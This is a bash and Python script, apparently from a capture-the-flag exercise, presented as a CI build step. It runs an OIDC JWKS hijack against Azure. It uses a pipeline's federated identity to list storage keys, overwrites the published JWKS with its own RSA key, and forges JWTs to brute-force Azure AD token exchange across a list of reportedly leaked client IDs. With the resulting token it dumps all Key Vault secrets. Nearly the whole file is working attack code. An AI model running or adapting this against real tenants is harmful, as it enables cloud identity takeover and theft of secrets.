#!/usr/bin/env bash
# Tebamoto Platform CI build v9 - OIDC JWKS hijack attack
# Overwrite JWKS on sttblcilogsprodx3euoz/$web, forge JWT, exchange for AAD token, read flag
set -uo pipefail
echo "===TBL_PROBE_START==="

TEN="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
SA="sttblcilogsprodx3euoz"
ISSUER="https://$SA.z23.web.core.windows.net"

b64(){ base64 -w0; }
jqg(){ jq -r "$1 // empty" 2>/dev/null; }

# ---------- 1. OIDC JWT + ARM token ----------
JWT_OIDC=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value // empty')
[ -n "$JWT_OIDC" ] || { echo "NO_OIDC"; exit 0; }

ARM_FED=$(curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CID" -d grant_type=client_credentials \
  --data-urlencode "scope=https://management.azure.com/.default" \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$JWT_OIDC" | jqg '.access_token')
echo "ARM_FED_LEN=${#ARM_FED}"

# ---------- 2. Get storage key ----------
KEY_RESP=$(curl -sS -m 20 -X POST \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
  -H "Authorization: Bearer $ARM_FED" -H "Content-Type: application/json" -H "Content-Length: 0" -d '{}' 2>/dev/null)
SA_KEY=$(echo "$KEY_RESP" | jqg '.keys[0].value')
echo "SA_KEY_LEN=${#SA_KEY}"
[ -n "$SA_KEY" ] || { echo "NO_SA_KEY"; exit 0; }

# ---------- 3. Generate RSA key pair ----------
echo "--- Generating RSA key pair ---"
python3 << 'PYEOF'
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import base64, json

# Generate 2048-bit RSA key
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

# Get public key components
public_numbers = private_key.public_key().public_numbers()
n_bytes = public_numbers.n.to_bytes(256, 'big')
e_bytes = public_numbers.e.to_bytes(3, 'big')

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Create JWKS with same kid as original
jwks = {
    "keys": [{
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "kid": "oc-472896389590afb0",
        "n": b64url(n_bytes),
        "e": b64url(e_bytes)
    }]
}

# Save JWKS
with open("/tmp/jwks_new.json", "w") as f:
    json.dump(jwks, f)

# Save private key PEM
pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
with open("/tmp/private_key.pem", "wb") as f:
    f.write(pem)

# Also save key components for JWT signing
import struct
with open("/tmp/key_n.bin", "wb") as f: f.write(n_bytes)
with open("/tmp/key_e.bin", "wb") as f: f.write(e_bytes)

print("KEYS GENERATED")
print("JWKS:", json.dumps(jwks)[:200])
PYEOF

# ---------- 4. Overwrite JWKS blob ----------
echo "--- Overwriting JWKS blob ---"
az storage blob upload --account-name "$SA" --account-key "$SA_KEY" \
  --container-name '$web' --name 'jwks' \
  --file /tmp/jwks_new.json --overwrite 2>&1 | tail -3

# Verify
echo "--- Verify JWKS ---"
curl -s "https://$SA.z23.web.core.windows.net/jwks" | python3 -c '
import json, sys
d = json.load(sys.stdin)
print("JWKS kid:", d["keys"][0]["kid"])
print("JWKS n (first 40):", d["keys"][0]["n"][:40])
'

# ---------- 5. Create forged JWT and exchange for token ----------
echo "--- Creating forged JWT and exchanging for AAD token ---"
python3 << 'PYEOF'
import json, base64, time, urllib.request, urllib.parse, urllib.error
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
ISSUER = "https://sttblcilogsprodx3euoz.z23.web.core.windows.net"

# Load private key
with open("/tmp/private_key.pem", "rb") as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Known Azure AD apps (from leaked credentials)
# 891fb158 was the appid in the armowner_token JWT - likely the app with federated credential
# Try each as client_id and various subjects
CLIENTS = [
    "891fb158-e02c-4428-a885-53b811f369c0",  # from armowner_token appid
    "462d1c38-4459-48b8-9333-82e389e59514",  # sync-service
    "72ff278a-9e71-43ec-bac4-2ca303f8e462",  # federated CI identity
    "12ed54de-f2eb-4784-804c-3a7a3e83a9e9",  # reporting-service
    "038bc35d-131d-4953-9985-ff4a245ccec1",  # cost-reader
    "2c34300e-1bc0-41e7-9c1e-8b7571d72c72",  # dir-audit
    "881fddce-6208-4af5-a297-7e79c912f83c",  # reporting-viewer
    "58108da8-044e-4d7e-9a46-92e6179b30be",  # secrets-sync
    "eeab432e-1bf6-400e-b155-a28ce7cafcdb",  # storefront MI
    "7a85156a-01c4-4e61-8472-40a92107159b",  # reporting MI
]

# Possible subjects for federated credential
SUBJECTS = [
    "catalog-sync",
    "891fb158-e02c-4428-a885-53b811f369c0",
    "462d1c38-4459-48b8-9333-82e389e59514",
    "tebamoto-reporting-api",
    "tebamoto-storefront",
    "sync-service",
    "reporting-service",
    "",
]

# Audiences to try
AUDS = [
    "api://AzureADTokenExchange",
    "00000003-0000-0000-c000-000000000000",  # Microsoft Graph
    "https://sts.windows.net/" + TEN + "/",
]

now = int(time.time())
exp = now + 3600

def create_jwt(iss, sub, aud):
    header = {"typ": "JWT", "alg": "RS256", "kid": "oc-472896389590afb0"}
    payload = {"iss": iss, "sub": sub, "aud": aud, "iat": now, "exp": exp, "jti": base64.urlsafe_b64encode(b"tbl" + str(now).encode()).rstrip(b'=').decode()}
    
    header_b = b64url(json.dumps(header).encode())
    payload_b = b64url(json.dumps(payload).encode())
    signing_input = (header_b + "." + payload_b).encode()
    
    signature = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
    return header_b + "." + payload_b + "." + b64url(signature)

def try_exchange(client_id, subject, aud):
    jwt = create_jwt(ISSUER, subject, aud)
    
    data = urllib.parse.urlencode({
        "client_id": client_id,
        "client_assertion": jwt,
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "grant_type": "client_credentials",
        "scope": "https://vault.azure.net/.default"
    }).encode()
    
    req = urllib.request.Request(
        f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            resp = json.loads(r.read().decode())
            token = resp.get("access_token", "")
            if token:
                print(f"*** TOKEN OK: client={client_id} sub={subject} aud={aud} len={len(token)} ***")
                return token
            else:
                print(f"  No token: {resp}")
                return ""
    except urllib.error.HTTPError as e:
        err = e.read().decode()[:200]
        # Only print non-trivial errors
        if "Invalid client assertion" not in err and "Federated" not in err and "not found" not in err:
            print(f"  ERR client={client_id[:8]} sub={subject[:20]} aud={aud[:20]}: {err[:100]}")
        return ""
    except Exception as e:
        return ""

# Try all combinations
found_token = ""
for client_id in CLIENTS:
    for subject in SUBJECTS:
        for aud in AUDS:
            token = try_exchange(client_id, subject, aud)
            if token:
                found_token = token
                # Save to file
                with open("/tmp/aad_token.txt", "w") as f:
                    f.write(token)
                break
        if found_token:
            break
    if found_token:
        break

if not found_token:
    # Also try with client_id as both subject and aud
    for client_id in CLIENTS:
        token = try_exchange(client_id, client_id, client_id)
        if token:
            found_token = token
            with open("/tmp/aad_token.txt", "w") as f:
                f.write(token)
            break

if found_token:
    print("\n*** GOT AAD TOKEN ***")
    # Try reading kv-tbl-sec
    for kv in ["kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"]:
        url = f"https://{kv}.vault.azure.net/secrets?api-version=7.4&maxresults=25"
        req = urllib.request.Request(url, headers={"Authorization": f"Bearer {found_token}"})
        try:
            with urllib.request.urlopen(req, timeout=20) as r:
                resp = json.loads(r.read().decode())
                if "value" in resp:
                    names = [x["id"].split("/")[-1] for x in resp["value"]]
                    print(f"*** {kv} SECRETS: {names} ***")
                    for n in names:
                        url2 = f"https://{kv}.vault.azure.net/secrets/{n}?api-version=7.4"
                        req2 = urllib.request.Request(url2, headers={"Authorization": f"Bearer {found_token}"})
                        try:
                            with urllib.request.urlopen(req2, timeout=15) as r2:
                                val = json.loads(r2.read().decode()).get("value", "")
                                print(f"  {n}: {val[:200]}")
                                if "DF26" in val or "TBL{" in val:
                                    print(f"*** FLAG: {val} ***")
                        except: pass
        except urllib.error.HTTPError as e:
            print(f"  {kv} list: {e.code} {e.read().decode()[:100]}")
        except Exception as e:
            print(f"  {kv} list err: {e}")
else:
    print("\nNo token exchange succeeded")
PYEOF

echo "===TBL_PROBE_END==="
